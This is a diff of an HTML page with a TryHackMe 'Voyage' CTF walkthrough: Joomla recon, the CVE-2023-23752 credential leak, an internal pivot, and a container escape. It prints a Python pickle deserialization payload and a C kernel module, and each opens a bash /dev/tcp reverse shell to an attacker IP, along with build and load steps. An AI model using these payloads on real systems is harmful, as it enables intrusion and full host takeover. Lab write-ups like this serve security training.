@@ -6,10 +6,40 @@
     <title>Voyage CTF - TryHackMe Walkthrough | Omar Mesalam</title>
     <link rel="stylesheet" href="../css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        .terminal-box {
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 1rem;
+            font-family: monospace;
+            color: #c9d1d9;
+            margin: 1rem 0;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .code-box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 1rem;
+            font-family: monospace;
+            color: #79c0ff;
+            margin: 1rem 0;
+            overflow-x: auto;
+            white-space: pre;
+        }
+        .writeup-text {
+            color: #d1d5db;
+            line-height: 1.7;
+            font-size: 1rem;
+            margin: 1rem 0;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <!-- Header / Back Link -->
         <header style="margin-bottom: 2rem;">
             <a href="../index.html" class="read-more" style="display: inline-flex; align-items: center; gap: 8px;">
                 <i class="fa-solid fa-arrow-left"></i> Back to Writeups
@@ -17,178 +47,243 @@
         </header>
 
         <main>
-            <!-- Article Header -->
             <article class="post-card" style="margin-bottom: 2rem;">
                 <div class="post-content">
                     <div class="post-meta">
                         <span class="post-date"><i class="fa-regular fa-calendar"></i> Aug 15, 2026</span>
                         <span class="post-category"><i class="fa-solid fa-flag"></i> CTF Writeup</span>
                     </div>
-                    <h1 class="post-title" style="font-size: 2rem; margin: 1rem 0;">Voyage - CTF - TryHackMe Walkthrough</h1>
+                    <h1 class="post-title" style="font-size: 2rem; margin: 1rem 0;">Voyage - CTF - TryHackMe</h1>
                     <div class="post-tags">
                         <span class="tag">TryHackMe</span>
-                        <span class="tag">Docker Escape</span>
-                        <span class="tag">Python Deserialization</span>
-                        <span class="tag">CAP_SYS_MODULE</span>
+                        <span class="tag">CTF</span>
+                        <span class="tag">Docker</span>
                     </div>
                 </div>
             </article>
 
-            <!-- Writeup Content -->
-            <div class="writeup-content" style="color: #d1d5db; line-height: 1.8;">
-                
-                <!-- 1. Reconnaissance -->
-                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
-                    <i class="fa-solid fa-network-wired"></i> 1. Reconnaissance & Enumeration
-                </h2>
-                <p>Now I have an IP address (<code>10.67.166.123</code>). I must first examine it to find out what services are available using Nmap:</p>
-                
-                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0; overflow-x: auto;">
-                    <div style="color: #8b949e; margin-bottom: 0.5rem;">┌──(root㉿omar)-[/home/mesalam/Downloads]<br>└─# nmap -Pn -sS -sV -O -sC 10.67.166.123</div>
-                    <pre style="color: #c9d1d9; margin: 0;">
-Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-14 07:40 EDT
+            <div class="writeup-content">
+                <p class="writeup-text">Now I have an IP address, I must first examine it to find out what services are available on it 10.67.166.123 Then i use nmap to do this step</p>
+
+                <div class="terminal-box">┌──(root㉿omar)-[/home/mesalam/Downloads]
+└─# nmap -Pn -sS -sV -O -sC 10.67.166.123
+Starting Nmap 7.95 ( https://nmap.org/ ) at 2026-08-14 07:40 EDT
 Nmap scan report for 10.67.166.123
 Host is up (0.22s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 d0:3c:08:c6:7f:c3:a8:ba:d0:42:f3:97:65:ff:9d:ac (ECDSA)
+|_  256 c9:52:f1:24:66:52:b4:59:af:50:46:8a:d0:29:93:4c (ED25519)
 80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
-| http-generator: Joomla! - Open Source Content Management
+|*http-generator: Joomla! - Open Source Content Management
 | http-robots.txt: 16 disallowed entries (15 shown)
+| /joomla/administrator/ /administrator/ /api/ /bin/
+| /cache/ /cli/ /components/ /includes/ /installation/
+|*/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+|*http-server-header: Apache/2.4.58 (Ubuntu)
 2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-                    </pre>
-                </div>
+| ssh-hostkey:
+|   3072 ad:4a:7e:34:01:09:f8:68:d8:f7:dd:b8:57:d4:17:cf (RSA)
+|   256 8d:cd:5e:60:35:c8:65:66:3a:c5:5c:2f:ac:62:93:80 (ECDSA)
+|*  256 a9:d5:16:b1:5d:4a:4c:94:3f:fd:a9:68:5f:24:ee:79 (ED25519)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=8/14%OT=22%CT=1%CU=42206%PV=Y%DS=3%DC=I%G=Y%TM=6A7EFEF
+OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=101%TI=Z%CI=Z%TS=A)SEQ(SP=1
+OS:05%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%
+OS:II=I%TS=A)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%I
+OS:SR=109%TI=Z%CI=Z%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8NNT11NW7%
+OS:O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4
+OS:=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y%Q=)T1(R
+OS:=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=
+OS:A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
+OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
+OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
+OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-                <p>Now we have nice information to start the attack. We notice port 80 is running Joomla! and port 2222 is running an additional SSH service.</p>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.25 seconds</div>
 
-                <p>Next, we run directory brute-forcing using <code>dirsearch</code> and <code>whatweb</code> to understand the web application footprint:</p>
+                <p class="writeup-text">we now have a nice information to start the attacks<br>now lets open Burpsuite to record everything while we open http<br>But after that we need to run some enumerations for this port<br>The First Thing :<br><code>gobuster dir -u http://10.67.166.123 -w /usr/share/seclists/Discovery/Web-Content/common.txt</code><br>The second :<br><code>dirsearch -u http://10.67.166.123 -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, swp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json</code><br>and i use it to understand the website</p>
 
-                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0; overflow-x: auto;">
-                    <div style="color: #8b949e; margin-bottom: 0.5rem;">┌──(root㉿omar)-[/home/mesalam/Downloads]<br>└─# whatweb http://10.67.166.123</div>
-                    <pre style="color: #c9d1d9; margin: 0;">
-http://10.67.166.123 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, MetaGenerator[Joomla! - Open Source Content Management], Title[Home]
-                    </pre>
-                </div>
+                <div class="terminal-box">┌──(root㉿omar)-[/home/mesalam/Downloads]
 
-                <p>Discovered paths via directory enumeration:</p>
-                <ul style="list-style-type: square; color: #9ca3af; margin-left: 1.5rem;">
-                    <td><code>/administrator/</code> — Redirects to administrator login page</td>
-                    <td><code>/htaccess.txt</code> — Server configuration rules</td>
-                    <td><code>/robots.txt</code> — Disallowed directory listings</td>
-                </ul>
+└─# whatweb http://10.67.166.123
+http://10.67.166.123 [200 OK] Apache[2.4.58], Cookies[310c29008fc04f792e0bccb4682e5b78], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[310c29008fc04f792e0bccb4682e5b78], IP[10.67.166.123], MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN]</div>
 
-                <!-- 2. Exploitation & Initial Access -->
-                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
-                    <i class="fa-solid fa-bug"></i> 2. Initial Access (CVE-2023-23752)
-                </h2>
-                <p>Analyzing the Joomla installation revealed version <strong>Joomla 4.2.7</strong>, which is vulnerable to an authentication bypass flaw (<code>CVE-2023-23752</code>).</p>
-                
-                <p>Exploiting this flaw allowed us to leak database credentials. Testing these credentials against SSH on port 22 failed, but succeeded on port <strong>2222</strong> with <code>RootPassword@1234</code>.</p>
+                <p class="writeup-text">now iam sure the website use joomla.<br>now i opened the website and show the source code but no thing interesting<br>i will use burp now and testing the main page that is login page<br>i do some config to make it easy<br><br>While i do it i notice some Enum is finished<br>and we have interesing directores and paths</p>
 
-                <p>Upon logging in, checking environment variables confirmed we were inside a Docker container:</p>
+                <div class="terminal-box">┌──(root㉿omar)-[/home/mesalam/Downloads]
 
-                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0;">
-                    <pre style="color: #c9d1d9; margin: 0;">
-root@f5eb774507f2:/# id
+└─# dirsearch -u http://10.67.166.123 -e conf, config, bak, backup, swp, old, db, sql, asp, aspx, py, rb, php, bak, bhp, cache, cgi, conf, csv, html, inc, jar, js, json, jsp, lock, log, rar, old, sql, sql.gz, sql.zip, tar.gz, swp, tar, tar.bz2, tar.gz, txt, wadl, zip, log, xml, js, json
+/administrator/cache/
+/administrator/includes/
+/administrator/logs/
+/administrator/
+/cache/
+/cli/
+/components/
+/configuration.php
+/htaccess.txt
+/images/
+/includes/
+/index.php
+/layouts/
+/LICENSE.txt
+/media/
+/modules/
+/plugins/
+/README.txt
+/robots.txt
+/templates/
+/templates/index.html
+/templates/system/
+/tmp/
+/web.config.txt</div>
+
+                <p class="writeup-text">Lets testing it<br>The first intesresting Find :<br><code>/administrator/includes/</code><br><br>The second find it was this —&gt; http://10.67.166.123/administrator/<br>it redirect me to admin page login<br><br>Ohoo interesting finding again<br>http://10.67.166.123/htaccess.txt<br>I think it maybe include the version of joomla<br><br>It is will be useful too<br>http://10.67.166.123/robots.txt</p>
+
+                <div class="terminal-box">User-agent: *
+Disallow: /administrator/
+Disallow: /api/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/</div>
+
+                <p class="writeup-text">Now we finish the directories that we accessed from eum<br>but we dont know the version<br>I will do something i hope to be useful<br><br>Some times i like Ai 😂<br>this path was include the version and it was Joomla 4.2.7 2023-01<br>I think it is very old .<br>Now i will install joomscan<br>its tool for joomla websites</p>
+
+                <div class="terminal-box">[+] Detecting Joomla Version
+[++] Joomla 4.2.7</div>
+
+                <p class="writeup-text">The tool brof that again<br>will the tool finish i will search about cves<br>I found CVE-2023-23752: Joomla Authentication Bypass<br>https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT<br>https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT<br><br>Now we obtain credentials but this cred doesnt work on port 22<br>but if try on 2222 it success RootPassword@1234<br>22 → failed<br>2222 → successful<br><br>But i think iam on Docker container<br><br>Now this Confirms that we are in docker</p>
+
+                <div class="terminal-box">root@f5eb774507f2:/# id
 uid=0(root) gid=0(root) groups=0(root)
 
-root@f5eb774507f2:/# cat /proc/1/cgroup
-0::/
-                    </pre>
-                </div>
+root@f5eb774507f2:/# hostname
+f5eb774507f2
 
-                <!-- 3. Internal Network Scanning & Pickle Ingestion -->
-                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
-                    <i class="fa-solid fa-server"></i> 3. Internal Pivot & Python Deserialization RCE
-                </h2>
-                <p>Scanning the internal subnet <code>192.168.100.0/24</code> from the container revealed three active hosts:</p>
+root@f5eb774507f2:/# hostname
+f5eb774507f2
+
+root@f5eb774507f2:/# cat /proc/1/cgroup
+0::/</div>
+
+                <p class="writeup-text">Now we need to discover the Network<br>Then i do ip a</p>
+
+                <div class="terminal-box">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+inet 127.0.0.1/8 scope host lo
+valid_lft forever preferred_lft forever
+inet6 ::1/128 scope host
+valid_lft forever preferred_lft forever
+8: eth0@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
+link/ether 02:42:c0:a8:64:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
+inet 192.168.100.10/24 brd 192.168.100.255 scope global eth0
+valid_lft forever preferred_lft forever</div>
+
+                <p class="writeup-text">inet 192.168.100.10/24 —→ Thats The important<br>now we will discover it<br><code>nmap -Pn -p- -sV 192.168.100.0-255</code></p>
 
                 <table style="width: 100%; border-collapse: collapse; margin: 1rem 0; background: #111827; border: 1px solid #1f2937;">
                     <thead>
                         <tr style="border-bottom: 1px solid #1f2937; color: #10b981; text-align: left;">
-                            <th style="padding: 0.75rem;">IP Address</th>
-                            <th style="padding: 0.75rem;">Role / Details</th>
-                            <th style="padding: 0.75rem;">Open Ports</th>
+                            <th style="padding: 0.5rem;">IP</th>
+                            <th style="padding: 0.5rem;">Role</th>
+                            <th style="padding: 0.5rem;">Open Ports</th>
+                            <th style="padding: 0.5rem;">Details</th>
                         </tr>
                     </thead>
                     <tbody>
                         <tr style="border-bottom: 1px solid #1f2937;">
-                            <td style="padding: 0.75rem;">192.168.100.1</td>
-                            <td style="padding: 0.75rem;">Host / Main Server</td>
-                            <td style="padding: 0.75rem;">22, 80, 2222, 5000</td>
+                            <td style="padding: 0.5rem;">192.168.100.1</td>
+                            <td style="padding: 0.5rem;">Host / Main Server</td>
+                            <td style="padding: 0.5rem;">22, 80, 2222, 5000</td>
+                            <td style="padding: 0.5rem;">Apache + SSH + another service</td>
                         </tr>
                         <tr style="border-bottom: 1px solid #1f2937;">
-                            <td style="padding: 0.75rem;">192.168.100.10</td>
-                            <td style="padding: 0.75rem;">Current Container</td>
-                            <td style="padding: 0.75rem;">22 (Ubuntu 20.04)</td>
+                            <td style="padding: 0.5rem;">192.168.100.10</td>
+                            <td style="padding: 0.5rem;">Current Container</td>
+                            <td style="padding: 0.5rem;">22</td>
+                            <td style="padding: 0.5rem;">Ubuntu 20.04, OpenSSH 8.2</td>
                         </tr>
                         <tr>
-                            <td style="padding: 0.75rem;">192.168.100.12</td>
-                            <td style="padding: 0.75rem;">Internal Flask App</td>
-                            <td style="padding: 0.75rem;">5000 (Werkzeug/3.1.3)</td>
+                            <td style="padding: 0.5rem;">192.168.100.12</td>
+                            <td style="padding: 0.5rem;">Internal Host/Container</td>
+                            <td style="padding: 0.5rem;">5000</td>
+                            <td style="padding: 0.5rem;">Python Flask/Werkzeug application</td>
                         </tr>
                     </tbody>
                 </table>
 
-                <p>By establishing SSH local port forwarding, we forwarded port 5000 to inspect requests via Burp Suite. The Flask application stored user sessions using serialized Python cookies:</p>
-                <p><code>session_data=80049525000000000000007d94288c04...</code></p>
+                <p class="writeup-text">The interesting discovery it was it<br>192.168.100.12:5000<br>Werkzeug/3.1.3<br>Python/3.10.12<br>now we need discover it<br><code>curl -i http://192.168.100.12:5000/</code><br>it make us to know this port is<br>Flask login panel<br>accept post method on / path<br>the unexpected thing heppened that it was the website doesnt validate the credentials<br>The Flask application was only accessible from the internal network so I decided to use SSH local port forwarding to access it from my machine and inspect the requests through Burp Suite<br>i made it and login with test test<br><br>then i think we need to show the req<br>we found it<br><code>session_data=80049525000000000000007d94288c0475736572948c0474657374948c07726576656e7565948c05383530303094752e</code><br>ummm i think i will try to use Ai to analysis it<br><br>Thats interesting<br>If we can prove that the application uses pickle.loads() to deserialize this cookie, I think we can potentially get RCE.<br>Now we prove it<br><br>then i use this script to generate a payload for reverse shell</p>
 
-                <p>Since the application relies on <code>pickle.loads()</code> to deserialize this session cookie, we generated an exploit payload for Remote Code Execution:</p>
+                <div class="code-box">import pickle
+import os
+import binascii
 
-                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0;">
-                    <pre style="color: #c9d1d9; margin: 0;">
-<span style="color: #ff7b72;">import</span> pickle
-<span style="color: #ff7b72;">import</span> os
-<span style="color: #ff7b72;">import</span> binascii
+class exploit(object):
+    def __reduce__(self):
+        return (os.system, ('bash -c "/bin/bash -i >& /dev/tcp/192.168.216.29/4444 0>&1"',))
 
-<span style="color: #ff7b72;">class</span> <span style="color: #ffa657;">Exploit</span>(object):
-    <span style="color: #ff7b72;">def</span> <span style="color: #d2a8ff;">__reduce__</span>(self):
-        <span style="color: #ff7b72;">return</span> (os.system, (<span style="color: #a5d6ff;">'bash -c "/bin/bash -i >& /dev/tcp/192.168.216.29/4444 0>&1"'</span>,))
+if __name__ == '__main__':
+    print(binascii.hexlify(pickle.dumps(exploit())))</div>
 
-<span style="color: #ff7b72;">if</span> __name__ == <span style="color: #a5d6ff;">'__main__'</span>:
-    <span style="color: #ff7b72;">print</span>(binascii.hexlify(pickle.dumps(Exploit())))
-                    </pre>
-                </div>
+                <p class="writeup-text">This generate a new cookie that have the payload inside<br>and i open shell to receive it<br><br>that give me another shell But it put me in another Contain Docker<br><br>I set up the connection like this</p>
 
-                <p>Injecting the generated cookie payload granted us a secondary reverse shell in a separate internal container context.</p>
+                <div class="terminal-box">script /dev/null -c bash
+stty raw -echo; fg
+reset
+xterm</div>
 
-                <!-- 4. Privilege Escalation & Container Escape -->
-                <h2 style="color: #10b981; border-bottom: 1px solid #1f2937; padding-bottom: 0.5rem; margin-top: 2rem;">
-                    <i class="fa-solid fa-terminal"></i> 4. Container Escape via CAP_SYS_MODULE
-                </h2>
-                <p>Running LinPEAS inside the new container highlighted a critical capability assigned to the container: <strong>CAP_SYS_MODULE</strong>.</p>
-                <p>This capability allows inserting Arbitrary Kernel Modules (LKM) directly into the running host system's kernel space.</p>
+                <p class="writeup-text">TTY / shell stabilization<br>Then i find the First Flag<br><br>Now we need to perform privilege escalation<br>Then I transferred LinPEAS to the container and executed it to enumerate potential privilege escalation<br>LinPEAS identified container/kernel-related security weaknesses including the presence of the host-relevant /proc interface and the CAP_SYS_MODULE capability.<br>The second important finding was that the container had the CAP_SYS_MODULE capability enabled.<br>This capability allowed us to load a kernel module into the running kernel<br>Now we need to do container escapescape<br>I used a reverse shell kernel module template from HackTricks and modified it to point to my attack machine</p>
 
-                <p>We created a custom C kernel module pointing a reverse shell back to our listener host:</p>
+                <div class="code-box">#include &lt;linux/kmod.h&gt;
+#include &lt;linux/module.h&gt;
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
 
-                <div class="terminal-block" style="background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; font-family: monospace; color: #58a6ff; margin: 1rem 0;">
-                    <pre style="color: #c9d1d9; margin: 0;">
-<span style="color: #ff7b72;">#include</span> <span style="color: #a5d6ff;">&lt;linux/kmod.h&gt;</span>
-<span style="color: #ff7b72;">#include</span> <span style="color: #a5d6ff;">&lt;linux/module.h&gt;</span>
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
-MODULE_LICENSE(<span style="color: #a5d6ff;">"GPL"</span>);
-MODULE_AUTHOR(<span style="color: #a5d6ff;">"AttackDefense"</span>);
-
-<span style="color: #ff7b72;">char</span>* argv[] = {<span style="color: #a5d6ff;">"/bin/bash"</span>, <span style="color: #a5d6ff;">"-c"</span>, <span style="color: #a5d6ff;">"bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"</span>, NULL};
-<span style="color: #ff7b72;">static char</span>* envp[] = {<span style="color: #a5d6ff;">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>, NULL};
-
-<span style="color: #ff7b72;">static int</span> __init reverse_shell_init(<span style="color: #ff7b72;">void</span>) {
-    <span style="color: #ff7b72;">return</span> call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
-<span style="color: #ff7b72;">static void</span> __exit reverse_shell_exit(<span style="color: #ff7b72;">void</span>) {
-    printk(KERN_INFO <span style="color: #a5d6ff;">"Exiting\n"</span>);
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
 }
 
 module_init(reverse_shell_init);
-module_exit(reverse_shell_exit);
-                    </pre>
-                </div>
+module_exit(reverse_shell_exit);</div>
 
-                <p>We targeted kernel headers present at <code>/lib/modules/6.8.0-1030-aws/build</code>, compiled <code>rev.ko</code> using a custom Makefile, and executed <code>insmod rev.ko</code>.</p>
+                <p class="writeup-text">Now we need to know the kernel<br><code>uname -r</code><br>6.8.0-1031-aws<br>Then look at the module headers that are available<br><code>ls -la /lib/modules/</code><br>Now we need to makefile<br>now i notice that kerner header 1030 is available and 1031 is running<br>so we will target 1030 For your information, this is not a general rule.<br><code>nano Makefile</code></p>
 
-                <p>The kernel module executed immediately in host space, escalating privileges from the container context to full **Root** access on the host node.</p>
+                <div class="code-box">obj-m += rev.o
+KDIR := /lib/modules/6.8.0-1030-aws/build
+PWD := $(shell pwd)
+all:
+	make -C $(KDIR) M=$(PWD) modules
+clean:
+	make -C $(KDIR) M=$(PWD) clean</div>
 
+                <p class="writeup-text"><code>make</code><br>now we have output rev.ko<br>I set up another listener on my machine and loaded the module.<br><br>Now the module executed immediately giving me a reverse shell on the host machine.<br>Now I had successfully escaped the container and obtained root access</p>
             </div>
         </main>
     </div>
